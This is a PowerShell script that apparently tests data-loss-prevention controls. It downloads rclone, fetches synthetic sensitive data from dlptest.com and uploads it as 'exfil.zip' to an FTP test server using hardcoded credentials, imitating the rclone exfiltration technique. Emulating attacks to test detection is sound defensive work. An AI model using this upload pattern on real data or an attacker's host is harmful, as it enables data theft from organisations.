# Define paths
$downloadDir = "C:\Users\Public\Downloads"
$rcloneUrl = "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
$rcloneZip = "$downloadDir\rclone.zip"
$rcloneExe = "$downloadDir\rclone.exe"
$exfilZip = "$downloadDir\exfil.zip"

# Create download directory if not exists
if (!(Test-Path $downloadDir)) {
    New-Item -ItemType Directory -Path $downloadDir | Out-Null
}

Write-Host "Downloading rclone..."
Invoke-WebRequest -Uri $rcloneUrl -OutFile $rcloneZip

Write-Host "Extracting rclone..."
Expand-Archive -Path $rcloneZip -DestinationPath $downloadDir -Force

# Find rclone.exe inside extracted folder
$rcloneExePath = Get-ChildItem $downloadDir -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName

# Fetch synthetic DLP data
Write-Host "Fetching synthetic test data..."
$dlpDataZip = "https://dlptest.com/DLP-Test-State-Data.zip"
Invoke-WebRequest -Uri $dlpDataZip -OutFile $exfilZip

# FTP setting / execution
Write-Host "Configuring FTP remote..."
& $rcloneExePath config create ftpserver ftp host ftp.dlptest.com user dlpuser pass rNrKYTX9g7z3RgJRmxWuGHbeu

Write-Host "Uploading exfil.zip to FTP..."
& $rcloneExePath copy $exfilZip ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate

Write-Host "Upload complete. Check DLP logs for activity."
